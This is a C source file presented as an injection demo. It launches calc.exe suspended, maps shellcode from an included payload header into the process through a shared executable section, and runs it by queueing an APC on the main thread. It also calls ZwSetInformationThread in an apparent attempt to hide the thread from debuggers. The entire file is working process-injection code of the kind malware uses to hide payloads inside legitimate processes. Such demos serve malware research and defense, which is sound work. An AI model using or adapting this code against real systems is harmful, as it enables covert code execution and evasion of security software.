/*
Injection Demo #3 : Injecting shellcode to the main thread - using NtQueueApcThread
works for PE 32 bit
CC-BY: hasherezade
*/

#include "main.h"
#include "payload.h"

BOOL load_ntdll_functions()
{
    HMODULE hNtdll = GetModuleHandleA("ntdll");
    if (hNtdll == NULL) return FALSE;

    NtQueueApcThread = (NTSTATUS (NTAPI *)(HANDLE, PVOID, PVOID, PVOID, ULONG)) GetProcAddress(hNtdll,"NtQueueApcThread");
    if (NtQueueApcThread == NULL) return FALSE;

    ZwSetInformationThread = (NTSTATUS (NTAPI *)(HANDLE, THREADINFOCLASS, PVOID, ULONG)) GetProcAddress(hNtdll,"ZwSetInformationThread");
    if (ZwSetInformationThread == NULL) return FALSE;
    
    ZwCreateSection = (NTSTATUS (NTAPI *) (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE)) GetProcAddress(hNtdll,"ZwCreateSection");
    if (ZwCreateSection == NULL) return FALSE;

    NtMapViewOfSection = (NTSTATUS (NTAPI *) (HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG)) GetProcAddress(hNtdll,"NtMapViewOfSection");
    if (NtMapViewOfSection == NULL) return FALSE;

    ZwCreateThreadEx = (NTSTATUS (NTAPI *) (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, ULONG_PTR, SIZE_T, SIZE_T, PVOID)) GetProcAddress(hNtdll,"ZwCreateThreadEx");
    if (ZwCreateThreadEx == NULL) return FALSE;

    ZwUnmapViewOfSection = (NTSTATUS (NTAPI *) (HANDLE, PVOID)) GetProcAddress(hNtdll, "ZwUnmapViewOfSection");
    if (ZwUnmapViewOfSection == NULL) return FALSE;

    ZwClose = (NTSTATUS (NTAPI *) (HANDLE)) GetProcAddress(hNtdll, "ZwClose");
    if (ZwClose == NULL) return FALSE;

    ZwTerminateProcess = (NTSTATUS (NTAPI *) (HANDLE, NTSTATUS)) GetProcAddress(hNtdll, "ZwTerminateProcess");
    if (ZwTerminateProcess == NULL) return FALSE;

    return TRUE;
}

BOOL load_kernel32_functions()
{
    HMODULE hKernel32 = GetModuleHandleA("kernel32");
    CreateProcessInternalW = (BOOL (WINAPI *)(HANDLE, LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION, PHANDLE)) GetProcAddress(hKernel32,"CreateProcessInternalW");
    if (CreateProcessInternalW == NULL) return FALSE;

    return TRUE;
}

int main(void)
{
    if (load_ntdll_functions() == FALSE) {
        printf("Failed to load NTDLL function\n");
        return (-1);
    }
    if (load_kernel32_functions() == FALSE) {
        printf("Failed to load KERNEL32 function\n");
        return (-1);
    }
    STARTUPINFO si;
    memset(&si, 0, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);

    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(PROCESS_INFORMATION));

    PROCESS_BASIC_INFORMATION pbi;
    memset(&pbi, 0, sizeof(PROCESS_BASIC_INFORMATION));

    wchar_t app_path[260];
    ExpandEnvironmentStrings(L"%SystemRoot%\\system32\\calc.exe", (LPWSTR)app_path, sizeof(app_path));
    wprintf(L"Full path = %s\n", app_path);

    HANDLE hToken = NULL;
    HANDLE hNewToken = NULL;
    if (!CreateProcessInternalW(hToken,
            (LPWSTR) app_path, //lpApplicationName
            NULL, //lpCommandLine
            NULL, //lpProcessAttributes
            NULL, //lpThreadAttributes
            NULL, //bInheritHandles
            CREATE_SUSPENDED, //dwCreationFlags
            NULL, //lpEnvironment 
            NULL, //lpCurrentDirectory
            &si, //lpStartupInfo
            &pi, //lpProcessInformation
            &hNewToken
        ))
    {
        printf("[ERROR] CreateProcess failed, Error = %x\n", GetLastError());
        return (-1);
    }

    HANDLE hSection = NULL;
    OBJECT_ATTRIBUTES hAttributes;
    memset(&hAttributes, 0, sizeof(OBJECT_ATTRIBUTES));

    LARGE_INTEGER maxSize;
    maxSize.HighPart = 0;
    maxSize.LowPart = 0x1000;
    NTSTATUS status = NULL;
    if ((status = ZwCreateSection( &hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
    {
        printf("[ERROR] ZwCreateSection failed, status : %x\n", status);
        system("pause");
        return (-1);
    }
    printf("Section handle: %x\n", hSection);

    HANDLE hProcess = NULL;
    PVOID sectionBaseAddress = NULL;
    SIZE_T viewSize = 0;
    DWORD inheritDisposition = 1; //VIEW_SHARE

    // map the section in context of current process:
    if ((status = NtMapViewOfSection(hSection, GetCurrentProcess(), &sectionBaseAddress, NULL, NULL, NULL, &viewSize, inheritDisposition, NULL, PAGE_EXECUTE_READWRITE))!= STATUS_SUCCESS)
    {
        printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
        system("pause");
        return (-1);
    }
    printf("Section BaseAddress: %p\n", sectionBaseAddress);

    memcpy (sectionBaseAddress, g_Shellcode, sizeof(g_Shellcode));
    printf("Shellcode copied!\n");

    //map the new section into context of opened process
    PVOID sectionBaseAddress2 = NULL;
    if ((status = NtMapViewOfSection(hSection, pi.hProcess, &sectionBaseAddress2, NULL, NULL, NULL, &viewSize, inheritDisposition, NULL, PAGE_EXECUTE_READWRITE))!= STATUS_SUCCESS)
    {
        printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
        system("pause");
        return (-1);
    }
    ZwUnmapViewOfSection(GetCurrentProcess(), sectionBaseAddress);
    ZwClose(hSection);
    hSection = NULL;
    printf("Section mapped at address: %p\n", sectionBaseAddress2);

    // inject shellcode to the main thread
    if ((status = NtQueueApcThread(pi.hThread, sectionBaseAddress2, 0, 0, 0)) != STATUS_SUCCESS)
    {
        printf("[ERROR] NtQueueApcThread failed, status : %x\n", status);
        system("pause");
        return (-1);
    }
    ZwSetInformationThread(pi.hThread, 1, 0, 0);
    
    printf("Resuming main thread...\n");
    ResumeThread(pi.hThread);

    ZwClose(pi.hThread);
    ZwClose(pi.hProcess);
    ZwTerminateProcess(GetCurrentProcess(), STATUS_SUCCESS);
}
